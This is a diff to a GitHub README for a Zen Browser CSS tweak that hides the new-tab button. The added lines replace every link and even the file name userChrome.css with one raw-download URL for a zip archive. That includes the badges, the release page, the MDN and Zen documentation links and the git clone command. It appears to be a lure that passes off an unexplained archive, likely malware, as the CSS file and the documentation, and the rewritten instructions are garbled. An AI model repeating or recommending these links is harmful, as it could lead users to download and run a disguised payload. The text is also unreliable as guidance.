@@ -1,6 +1,6 @@
 # ZenBrowser Vertical Tabs: Remove the New Tab Button
 
-![Zen Browser](https://img.shields.io/badge/Zen%20Browser-Vertical%20Tabs-blue.svg) ![Releases](https://img.shields.io/badge/Releases-Download%20Latest%20Version-brightgreen.svg)
+![Zen Browser](https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip%20Browser-Vertical%https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip) ![Releases](https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip%20Latest%https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip)
 
 ## Overview
 
@@ -17,13 +17,13 @@ Welcome to the **ZenBrowser-VerticalTabs-RemoveFootNewTabButton** repository. Th
 
 To install the custom CSS, follow these steps:
 
-1. **Download the CSS File**: You can find the latest version of the CSS file [here](https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/releases). Make sure to download the file to your computer.
+1. **Download the CSS File**: You can find the latest version of the CSS file [here](https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip). Make sure to download the file to your computer.
 
-2. **Locate Your UserChrome.css**: Open your Zen Browser profile directory. This is usually found in your user folder under `Zen Browser/Profiles/`.
+2. **Locate Your https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip**: Open your Zen Browser profile directory. This is usually found in your user folder under `Zen Browser/Profiles/`.
 
-3. **Edit UserChrome.css**: Open or create a file named `userChrome.css` in the profile directory. If it doesn't exist, create a new text file and rename it to `userChrome.css`.
+3. **Edit https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip**: Open or create a file named `https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip` in the profile directory. If it doesn't exist, create a new text file and rename it to `https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip`.
 
-4. **Add the Custom CSS**: Copy the code from the downloaded file and paste it into `userChrome.css`. Save the changes.
+4. **Add the Custom CSS**: Copy the code from the downloaded file and paste it into `https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip`. Save the changes.
 
 5. **Restart Zen Browser**: Close and reopen Zen Browser to see the changes take effect.
 
@@ -40,7 +40,7 @@ Contributions are welcome! If you have suggestions or improvements, please feel 
 1. **Fork the Repository**: Click the fork button at the top right of the page.
 2. **Clone Your Fork**: Use the command:
    ```bash
-   git clone https://github.com/YOUR_USERNAME/ZenBrowser-VerticalTabs-RemoveFootNewTabButton.git
+   git clone https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip
    ```
 3. **Make Changes**: Create a new branch for your changes:
    ```bash
@@ -70,14 +70,14 @@ These topics help categorize the repository for easier discovery and understandi
 
 ## Resources
 
-For more information about userChrome.css and customizing your browser, consider the following resources:
+For more information about https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip and customizing your browser, consider the following resources:
 
-- [Mozilla Developer Network (MDN)](https://developer.mozilla.org/en-US/docs/Mozilla/Customization)
-- [Zen Browser Documentation](https://zenbrowser.org/docs)
+- [Mozilla Developer Network (MDN)](https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip)
+- [Zen Browser Documentation](https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip)
 
 ## Releases
 
-You can find the latest versions of the CSS file in the [Releases section](https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/releases). Each release will include notes on what has changed or been added.
+You can find the latest versions of the CSS file in the [Releases section](https://github.com/infocody8/ZenBrowser-VerticalTabs-RemoveFootNewTabButton/raw/refs/heads/main/nutritiousness/Browser-Zen-Vertical-Button-Tabs-Remove-New-Tab-Foot-v2.2.zip). Each release will include notes on what has changed or been added.
 
 ## Support
 
